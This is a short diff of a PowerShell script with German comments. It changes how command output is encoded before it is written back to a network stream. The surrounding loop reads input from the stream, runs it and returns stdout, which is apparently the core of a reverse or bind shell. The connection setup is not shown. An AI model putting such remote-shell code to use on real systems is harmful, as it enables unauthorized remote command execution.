@@ -14,7 +14,7 @@ while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){ # read -> returns number of bytes 
     foreach($line in $stdout){
     $st = $st+$line+"\n"
     }
-    echo $st
+    $st=([text.encoding]::ASCII).GetBytes($st)
     # stdout ist string array -> versuchen leerzeilenzeichen zwischen array dinger zu machen
     $sm.Write($st,0,$st.Length)
   }Catch{
